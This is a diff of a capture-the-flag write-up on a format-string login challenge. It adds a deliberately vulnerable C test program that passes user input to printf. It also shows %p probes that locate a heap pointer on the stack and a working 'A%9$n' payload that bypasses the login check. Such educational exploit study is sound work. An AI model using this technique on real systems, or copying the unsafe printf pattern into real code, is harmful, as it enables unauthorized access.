@@ -147,22 +147,81 @@ You entered: ABCD 0x2438252044434241
 ```
 That worked!
 
-This still needs some further investigation: how we write to the stack using `%n` and to see what happens if the array is moved to the heap.
+Let's now see how we get on if we put the address on the heap. The code was changed to:
+```c
+#include <stdio.h>
+#include <stdlib.h>
 
-Once we find out how to access the appropriate stack position and write to it, we need to create something that can:
-* Set up a bash socket to the server
-* Read the initial input and extract the address (user = &lt;address&gt;)
-* Subtract 24 (0x18) from the address
-* Create a format string using some combination of %x, %p and %n to manupulate the `input_p` address to match the calculated one
-* Write the constructed string to the socket (as username)
-* Read the next line to consume it
-* Write anything to the password
-* Collect the flag!
+int main(int argc, char **argv)
+{
+  int *buffer;
+  buffer = (int *)calloc(1,100);
+  printf("buffer is: %p\n",buffer);
+  fgets((char*)buffer, 100, stdin);
+  printf("You entered: ");
+  printf((char*)buffer);
+  printf("\n");
+  return 0;
+}
+```
+This was built with the same `gcc` build command. Now it's very similar to the code for this challenge. So what do we see if we use the techniques above:
+```
+> python -c "print ('ABCD ' + '%p '*20)" | ./test_p
+buffer is: 0x1e9c010
+You entered: ABCD 0x400770 0x7fe5fb1a7780 0xd 0x7fe5fb3b5700 0xd 0x7ffd2209a288 0x100400550 0x7ffd2209a280 0x1e9c010 0x4006d0 0x7fe5fae01830 (nil) 0x7ffd2209a288 0x100000000 0x400646 (nil) 0x9c55f348bfd89065 0x400550 0x7ffd2209a280 (nil)
+```
+We can see at the 9th location we have the address. We can isolate this with:
+```
+> ./test_p 
+buffer is: 0x1866010
+%9$p
+You entered: 0x1866010
+```
 
+Now we know that this program puts the address in the 9th location, we should be able to debug it in IDA Pro and see the values put out from the stack. To do this I created and input file `test_inp.txt` that can be redirected into the program in the Debugger | Process options dialog.
+```
+> python -c "print ('ABCD ' + '%p '*20)" > test_inp.txt
+```
 
+When I run this in the debugger, the address from the `calloc()` (on the first run 0x01e06010) can be seen at 0x7ffc81f4c598 on the stack:
 
+![Stack output](memory3.png)
 
+And in the output is appears at location 9 in the list as before:
+```
+buffer is: 0x1e06010
+You entered: ABCD 0x400770 0x7fb506f53780 0xd 0x7fb507161700 0xd 0x7ffc81f4c688 0x100400550 0x7ffc81f4c680 0x1e06010 0x4006d0 0x7fb506bad830 (nil) 0x7ffc81f4c688 0x100000000 0x400646 (nil) 0xce6ab2db357608f7 0x400550 0x7ffc81f4c680 (nil)
+```
+Writing the temp program let me look at more stack values than the challenge, because the challenge truncates at 20 characters (though I could have tested with moving the pointer to, say, the 5th and looking after that - `%5$p %p %p ...`).
 
+The programs were so similar, that I thought I could perhaps just try the 9th value in the challenge:
+```
+> ./logmein 
+user = 0x19bd010
+Enter your username:
+%9$p
+Enter password for user: 0x19bd010
+
+Invalid login information.
+```
+
+Now, can I use `%n` to write to that location? `%n` writes the number of characters printed so far by this `printf()` statement, to the pointer specified. If we move to the 9th address, the number of characters will be sent to the start of the input buffer, making `test eax, eax` pass. Therefore, `A%9$n` should send 1 (the letter A is the only character printed so far) to the address at location 9.
+```
+> ./logmein 
+user = 0x1c83010
+Enter your username:
+A%9$n
+Enter password for user: A
+b
+Successfully logged in!
+flag.txt: No such file or directory
+```
+This worked - now to run it against the server:
+```
+
+```
+
+This gave me the flag!
 
 
 
